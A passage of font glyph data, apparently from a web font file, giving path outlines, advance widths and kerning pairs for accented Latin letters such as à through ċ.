":5,"\u00f4":5,"\u00f5":5,"\u00f6":5,"\u00f8":5,"\u014d":5,"\u014f":5,"\u0151":5,"\u01ff":5,"A":18,"\u00c0":18,"\u00c1":18,"\u00c2":18,"\u00c3":18,"\u00c4":18,"\u00c5":18,"\u0100":18,"\u0102":18,"\u0104":18,"\u00c6":23,"\u01fc":23,"a":18,"\u00e0":18,"\u00e1":18,"\u00e2":18,"\u00e3":18,"\u00e4":18,"\u00e5":18,"\u0101":18,"\u0103":18,"\u0105":18,"\u00e6":23,"\u01fd":23,"J":13,"\u0132":13,"\u0134":13,"j":13,"\u0133":13,"\u0135":13,"\u0237":13,"S":3,"\u015a":3,"\u015c":3,"\u015e":3,"\u0160":3,"\u0218":3,"\u1e60":3,"s":3,"\u00df":3,"\u015b":3,"\u015d":3,"\u015f":3,"\u0161":3,"\u0219":3,"\u1e61":3}},"\u00de":{"d":"14,0r0,-252r40,0r0,29v65,-7,78,29,78,95v0,47,-27,66,-78,62r0,66r-40,0xm92,-163v1,-27,-15,-24,-38,-24r0,85v22,0,38,3,38,-24r0,-37","w":135,"k":{"\u1ef3":3,"\u1ef2":3,"\u0237":3,"\u01fd":7,"\u01fc":7,"\u017e":4,"\u017d":4,"\u017c":4,"\u017b":4,"\u017a":4,"\u0179":4,"\u0178":3,"\u0177":3,"\u0176":3,"\u0135":3,"\u0134":3,"\u0133":3,"\u0132":3,"\u0105":1,"\u0104":1,"\u0103":1,"\u0102":1,"\u0101":1,"\u0100":1,"\u00ff":3,"\u00fd":3,"\u00e6":7,"\u00e5":1,"\u00e4":1,"\u00e3":1,"\u00e2":1,"\u00e1":1,"\u00e0":1,"\u00dd":3,"\u00c6":7,"\u00c5":1,"\u00c4":1,"\u00c3":1,"\u00c2":1,"\u00c1":1,"\u00c0":1,"z":4,"y":3,"j":3,"a":1,"Z":4,"Y":3,"J":3,"A":1,"\u2026":29,"\u201e":29,"\u201a":29,"x":7,"X":7,".":29,",":29}},"\u00df":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134xm144,-192v0,-40,19,-63,58,-63v42,0,62,27,59,73r-38,0v10,-38,-39,-55,-39,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r37,0v-1,23,0,45,21,45v13,0,20,-7,20,-25v0,-52,-77,-62,-77,-134","w":269,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00e0":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm24,-306r43,0r26,42r-30,0","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11,"T":14,"\u0162":14,"\u0164":14,"\u0166":14,"\u021a":14,"\u1e6a":14,"W":5,"\u0174":5,"\u1e80":5,"\u1e82":5,"\u1e84":5,"Y":18,"\u00dd":18,"\u0176":18,"\u0178":18,"\u1ef2":18,"-":4,"\u00ad":4,"t":14,"\u0163":14,"\u0165":14,"\u0167":14,"\u021b":14,"\u1e6b":14,"w":5,"\u0175":5,"\u1e81":5,"\u1e83":5,"\u1e85":5,"y":18,"\u00fd":18,"\u00ff":18,"\u0177":18,"\u1ef3":18}},"\u00e1":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm80,-306r41,0r-39,42r-28,0","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11,"T":14,"\u0162":14,"\u0164":14,"\u0166":14,"\u021a":14,"\u1e6a":14,"W":5,"\u0174":5,"\u1e80":5,"\u1e82":5,"\u1e84":5,"Y":18,"\u00dd":18,"\u0176":18,"\u0178":18,"\u1ef2":18,"-":4,"\u00ad":4,"t":14,"\u0163":14,"\u0165":14,"\u0167":14,"\u021b":14,"\u1e6b":14,"w":5,"\u0175":5,"\u1e81":5,"\u1e83":5,"\u1e85":5,"y":18,"\u00fd":18,"\u00ff":18,"\u0177":18,"\u1ef3":18}},"\u00e2":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm57,-264r-36,0r33,-42r38,0r34,42r-36,0r-17,-21","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11,"T":14,"\u0162":14,"\u0164":14,"\u0166":14,"\u021a":14,"\u1e6a":14,"W":5,"\u0174":5,"\u1e80":5,"\u1e82":5,"\u1e84":5,"Y":18,"\u00dd":18,"\u0176":18,"\u0178":18,"\u1ef2":18,"-":4,"\u00ad":4,"t":14,"\u0163":14,"\u0165":14,"\u0167":14,"\u021b":14,"\u1e6b":14,"w":5,"\u0175":5,"\u1e81":5,"\u1e83":5,"\u1e85":5,"y":18,"\u00fd":18,"\u00ff":18,"\u0177":18,"\u1ef3":18}},"\u00e3":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm107,-305r20,15v-17,39,-45,23,-72,16v-7,0,-10,3,-15,12r-21,-15v17,-38,45,-24,72,-16v7,0,11,-3,16,-12","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11,"T":14,"\u0162":14,"\u0164":14,"\u0166":14,"\u021a":14,"\u1e6a":14,"W":5,"\u0174":5,"\u1e80":5,"\u1e82":5,"\u1e84":5,"Y":18,"\u00dd":18,"\u0176":18,"\u0178":18,"\u1ef2":18,"-":4,"\u00ad":4,"t":14,"\u0163":14,"\u0165":14,"\u0167":14,"\u021b":14,"\u1e6b":14,"w":5,"\u0175":5,"\u1e81":5,"\u1e83":5,"\u1e85":5,"y":18,"\u00fd":18,"\u00ff":18,"\u0177":18,"\u1ef3":18}},"\u00e4":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm26,-301r37,0r0,37r-37,0r0,-37xm84,-301r36,0r0,37r-36,0r0,-37","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11,"T":14,"\u0162":14,"\u0164":14,"\u0166":14,"\u021a":14,"\u1e6a":14,"W":5,"\u0174":5,"\u1e80":5,"\u1e82":5,"\u1e84":5,"Y":18,"\u00dd":18,"\u0176":18,"\u0178":18,"\u1ef2":18,"-":4,"\u00ad":4,"t":14,"\u0163":14,"\u0165":14,"\u0167":14,"\u021b":14,"\u1e6b":14,"w":5,"\u0175":5,"\u1e81":5,"\u1e83":5,"\u1e85":5,"y":18,"\u00fd":18,"\u00ff":18,"\u0177":18,"\u1ef3":18}},"\u00e5":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm43,-293v0,-17,13,-30,30,-30v17,0,30,13,30,30v0,17,-13,30,-30,30v-17,0,-30,-13,-30,-30xm73,-305v-15,0,-13,23,0,23v6,0,12,-5,12,-11v0,-6,-6,-12,-12,-12","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11,"T":14,"\u0162":14,"\u0164":14,"\u0166":14,"\u021a":14,"\u1e6a":14,"W":5,"\u0174":5,"\u1e80":5,"\u1e82":5,"\u1e84":5,"Y":18,"\u00dd":18,"\u0176":18,"\u0178":18,"\u1ef2":18,"-":4,"\u00ad":4,"t":14,"\u0163":14,"\u0165":14,"\u0167":14,"\u021b":14,"\u1e6b":14,"w":5,"\u0175":5,"\u1e81":5,"\u1e83":5,"\u1e85":5,"y":18,"\u00fd":18,"\u00ff":18,"\u0177":18,"\u1ef3":18}},"\u00e6":{"d":"130,-216r0,70r55,0r0,36r-55,0r0,74r69,0r0,36r-108,0r0,-46r-40,0r-12,46r-38,0r68,-252r130,0r0,36r-69,0xm60,-80r31,0r0,-121","w":208},"\u00e7":{"d":"68,64v-17,0,-32,-9,-31,-28r23,0v-1,7,3,10,8,10v6,0,9,-4,9,-10v1,-8,-7,-11,-17,-10r0,-24v-75,-5,-49,-120,-49,-194v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61r37,0v3,52,-6,95,-51,97r0,11v14,0,23,8,23,21v0,22,-15,29,-33,29","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u00e8":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm19,-306r43,0r26,42r-30,0","w":132},"\u00e9":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm75,-306r41,0r-39,42r-28,0","w":132},"\u00ea":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm51,-264r-36,0r34,-42r38,0r33,42r-35,0r-17,-21","w":132},"\u00eb":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm21,-301r37,0r0,37r-37,0r0,-37xm78,-301r37,0r0,37r-37,0r0,-37","w":132},"\u00ec":{"d":"14,0r0,-252r40,0r0,252r-40,0xm-14,-306r42,0r26,42r-30,0","w":68},"\u00ed":{"d":"14,0r0,-252r40,0r0,252r-40,0xm41,-306r41,0r-39,42r-28,0","w":68},"\u00ee":{"d":"14,0r0,-252r40,0r0,252r-40,0xm18,-264r-36,0r33,-42r38,0r34,42r-36,0r-17,-21","w":68},"\u00ef":{"d":"14,0r0,-252r40,0r0,252r-40,0xm-13,-301r37,0r0,37r-37,0r0,-37xm45,-301r36,0r0,37r-36,0r0,-37","w":68},"\u00f0":{"d":"14,0r0,-110r-13,0r0,-32r13,0r0,-110v64,-2,127,-5,122,62v-6,77,28,194,-59,190r-63,0xm96,-192v1,-28,-18,-24,-42,-24r0,74r24,0r0,32r-24,0r0,74v23,0,42,4,42,-24r0,-132","w":146,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00f1":{"d":"99,0r-49,-183r0,183r-36,0r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0xm110,-305r20,15v-17,39,-44,23,-71,16v-7,0,-11,3,-16,12r-20,-15v17,-39,44,-23,71,-16v7,0,11,-3,16,-12","w":153},"\u00f2":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm22,-306r43,0r26,42r-30,0","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00f3":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm78,-306r41,0r-39,42r-28,0","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00f4":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm54,-264r-35,0r33,-42r38,0r33,42r-35,0r-17,-21","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00f5":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm105,-305r20,15v-17,39,-44,23,-71,16v-7,0,-11,3,-16,12r-20,-15v17,-39,44,-23,71,-16v7,0,11,-3,16,-12","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00f6":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm24,-301r37,0r0,37r-37,0r0,-37xm82,-301r36,0r0,37r-36,0r0,-37","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00f7":{"d":"52,-90r38,0r0,38r-38,0r0,-38xm52,-200r38,0r0,38r-38,0r0,-38xm9,-140r125,0r0,28r-125,0r0,-28"},"\u00f8":{"d":"24,-17v-25,-38,-8,-117,-13,-175v-5,-55,53,-77,96,-54r7,-19r14,4r-10,26v26,37,8,117,13,175v5,55,-53,77,-96,54r-7,19r-13,-4xm51,-194r0,104r40,-112v-6,-24,-40,-24,-40,8xm51,-50v5,25,41,24,41,-8r0,-104","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00f9":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm23,-306r43,0r26,42r-30,0","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00fa":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm79,-306r41,0r-39,42r-28,0","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00fb":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm55,-264r-35,0r33,-42r38,0r34,42r-36,0r-17,-21","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00fc":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm25,-301r37,0r0,37r-37,0r0,-37xm83,-301r37,0r0,37r-37,0r0,-37","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00fd":{"d":"51,0r0,-84r-50,-168r42,0r30,115r30,-115r38,0r-50,168r0,84r-40,0xm80,-306r41,0r-39,42r-28,0","k":{"\u2026":29,"\u201e":29,"\u201a":29,"\u0153":5,"\u0152":5,"}":-2,"q":5,"]":-2,"Q":5,";":7,":":7,".":29,",":29,")":-2,"C":5,"\u00c7":5,"\u0106":5,"\u0108":5,"\u010a":5,"\u010c":5,"G":5,"\u011c":5,"\u011e":5,"\u0120":5,"\u0122":5,"O":5,"\u00d2":5,"\u00d3":5,"\u00d4":5,"\u00d5":5,"\u00d6":5,"\u00d8":5,"\u014c":5,"\u014e":5,"\u0150":5,"\u01fe":5,"-":6,"\u00ad":6,"c":5,"\u00e7":5,"\u0107":5,"\u0109":5,"\u010b":5,"\u010d":5,"g":5,"\u011d":5,"\u011f":5,"\u0121":5,"\u0123":5,"o":5,"\u00f2":5,"\u00f3":5,"\u00f4":5,"\u00f5":5,"\u00f6":5,"\u00f8":5,"\u014d":5,"\u014f":5,"\u0151":5,"\u01ff":5,"A":18,"\u00c0":18,"\u00c1":18,"\u00c2":18,"\u00c3":18,"\u00c4":18,"\u00c5":18,"\u0100":18,"\u0102":18,"\u0104":18,"\u00c6":23,"\u01fc":23,"a":18,"\u00e0":18,"\u00e1":18,"\u00e2":18,"\u00e3":18,"\u00e4":18,"\u00e5":18,"\u0101":18,"\u0103":18,"\u0105":18,"\u00e6":23,"\u01fd":23,"J":13,"\u0132":13,"\u0134":13,"j":13,"\u0133":13,"\u0135":13,"\u0237":13,"S":3,"\u015a":3,"\u015c":3,"\u015e":3,"\u0160":3,"\u0218":3,"\u1e60":3,"s":3,"\u00df":3,"\u015b":3,"\u015d":3,"\u015f":3,"\u0161":3,"\u0219":3,"\u1e61":3}},"\u00fe":{"d":"14,0r0,-252r40,0r0,29v65,-7,78,29,78,95v0,47,-27,66,-78,62r0,66r-40,0xm92,-163v1,-27,-15,-24,-38,-24r0,85v22,0,38,3,38,-24r0,-37","w":135,"k":{"\u1ef3":3,"\u1ef2":3,"\u0237":3,"\u01fd":7,"\u01fc":7,"\u017e":4,"\u017d":4,"\u017c":4,"\u017b":4,"\u017a":4,"\u0179":4,"\u0178":3,"\u0177":3,"\u0176":3,"\u0135":3,"\u0134":3,"\u0133":3,"\u0132":3,"\u0105":1,"\u0104":1,"\u0103":1,"\u0102":1,"\u0101":1,"\u0100":1,"\u00ff":3,"\u00fd":3,"\u00e6":7,"\u00e5":1,"\u00e4":1,"\u00e3":1,"\u00e2":1,"\u00e1":1,"\u00e0":1,"\u00dd":3,"\u00c6":7,"\u00c5":1,"\u00c4":1,"\u00c3":1,"\u00c2":1,"\u00c1":1,"\u00c0":1,"z":4,"y":3,"j":3,"a":1,"Z":4,"Y":3,"J":3,"A":1,"\u2026":29,"\u201e":29,"\u201a":29,"x":7,"X":7,".":29,",":29}},"\u00ff":{"d":"51,0r0,-84r-50,-168r42,0r30,115r30,-115r38,0r-50,168r0,84r-40,0xm26,-301r36,0r0,37r-36,0r0,-37xm83,-301r37,0r0,37r-37,0r0,-37","k":{"\u2026":29,"\u201e":29,"\u201a":29,"\u0153":5,"\u0152":5,"}":-2,"q":5,"]":-2,"Q":5,";":7,":":7,".":29,",":29,")":-2,"C":5,"\u00c7":5,"\u0106":5,"\u0108":5,"\u010a":5,"\u010c":5,"G":5,"\u011c":5,"\u011e":5,"\u0120":5,"\u0122":5,"O":5,"\u00d2":5,"\u00d3":5,"\u00d4":5,"\u00d5":5,"\u00d6":5,"\u00d8":5,"\u014c":5,"\u014e":5,"\u0150":5,"\u01fe":5,"-":6,"\u00ad":6,"c":5,"\u00e7":5,"\u0107":5,"\u0109":5,"\u010b":5,"\u010d":5,"g":5,"\u011d":5,"\u011f":5,"\u0121":5,"\u0123":5,"o":5,"\u00f2":5,"\u00f3":5,"\u00f4":5,"\u00f5":5,"\u00f6":5,"\u00f8":5,"\u014d":5,"\u014f":5,"\u0151":5,"\u01ff":5,"A":18,"\u00c0":18,"\u00c1":18,"\u00c2":18,"\u00c3":18,"\u00c4":18,"\u00c5":18,"\u0100":18,"\u0102":18,"\u0104":18,"\u00c6":23,"\u01fc":23,"a":18,"\u00e0":18,"\u00e1":18,"\u00e2":18,"\u00e3":18,"\u00e4":18,"\u00e5":18,"\u0101":18,"\u0103":18,"\u0105":18,"\u00e6":23,"\u01fd":23,"J":13,"\u0132":13,"\u0134":13,"j":13,"\u0133":13,"\u0135":13,"\u0237":13,"S":3,"\u015a":3,"\u015c":3,"\u015e":3,"\u0160":3,"\u0218":3,"\u1e60":3,"s":3,"\u00df":3,"\u015b":3,"\u015d":3,"\u015f":3,"\u0161":3,"\u0219":3,"\u1e61":3}},"\u0100":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm30,-296r87,0r0,30r-87,0r0,-30","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11}},"\u0101":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm30,-296r87,0r0,30r-87,0r0,-30","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11,"T":14,"\u0162":14,"\u0164":14,"\u0166":14,"\u021a":14,"\u1e6a":14,"W":5,"\u0174":5,"\u1e80":5,"\u1e82":5,"\u1e84":5,"Y":18,"\u00dd":18,"\u0176":18,"\u0178":18,"\u1ef2":18,"-":4,"\u00ad":4,"t":14,"\u0163":14,"\u0165":14,"\u0167":14,"\u021b":14,"\u1e6b":14,"w":5,"\u0175":5,"\u1e81":5,"\u1e83":5,"\u1e85":5,"y":18,"\u00fd":18,"\u00ff":18,"\u0177":18,"\u1ef3":18}},"\u0102":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm91,-306r25,0v0,27,-15,43,-43,43v-28,0,-42,-16,-42,-43r24,0v0,24,36,24,36,0","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11}},"\u0103":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm91,-306r25,0v0,27,-15,43,-43,43v-28,0,-42,-16,-42,-43r24,0v0,24,36,24,36,0","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11,"T":14,"\u0162":14,"\u0164":14,"\u0166":14,"\u021a":14,"\u1e6a":14,"W":5,"\u0174":5,"\u1e80":5,"\u1e82":5,"\u1e84":5,"Y":18,"\u00dd":18,"\u0176":18,"\u0178":18,"\u1ef2":18,"-":4,"\u00ad":4,"t":14,"\u0163":14,"\u0165":14,"\u0167":14,"\u021b":14,"\u1e6b":14,"w":5,"\u0175":5,"\u1e81":5,"\u1e83":5,"\u1e85":5,"y":18,"\u00fd":18,"\u00ff":18,"\u0177":18,"\u1ef3":18}},"\u0104":{"d":"102,-252r41,252v-24,-7,-38,24,-13,27v7,0,9,-1,13,-2r0,20v-20,8,-58,6,-56,-18v0,-9,4,-19,16,-27r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11}},"\u0105":{"d":"102,-252r41,252v-24,-7,-38,24,-13,27v7,0,9,-1,13,-2r0,20v-20,8,-58,6,-56,-18v0,-9,4,-19,16,-27r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11,"T":14,"\u0162":14,"\u0164":14,"\u0166":14,"\u021a":14,"\u1e6a":14,"W":5,"\u0174":5,"\u1e80":5,"\u1e82":5,"\u1e84":5,"Y":18,"\u00dd":18,"\u0176":18,"\u0178":18,"\u1ef2":18,"-":4,"\u00ad":4,"t":14,"\u0163":14,"\u0165":14,"\u0167":14,"\u021b":14,"\u1e6b":14,"w":5,"\u0175":5,"\u1e81":5,"\u1e83":5,"\u1e85":5,"y":18,"\u00fd":18,"\u00ff":18,"\u0177":18,"\u1ef3":18}},"\u0106":{"d":"92,-94r37,0v4,55,-7,97,-59,97v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61xm77,-306r41,0r-39,42r-28,0","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u0107":{"d":"92,-94r37,0v4,55,-7,97,-59,97v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61xm77,-306r41,0r-39,42r-28,0","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u0108":{"d":"92,-94r37,0v4,55,-7,97,-59,97v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61xm53,-264r-35,0r33,-42r38,0r33,42r-35,0r-17,-21","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u0109":{"d":"92,-94r37,0v4,55,-7,97,-59,97v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61xm53,-264r-35,0r33,-42r38,0r33,42r-35,0r-17,-21","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u010a":{"d":"92,-94r37,0v4,55,-7,97,-59,97v-86,0,-59,-117,-59,-195v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61xm52,-301r37,0r0,37r-37,0r0,-37","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u010b":{"d":"92,-94r37,0v4,55,-7,97,-59,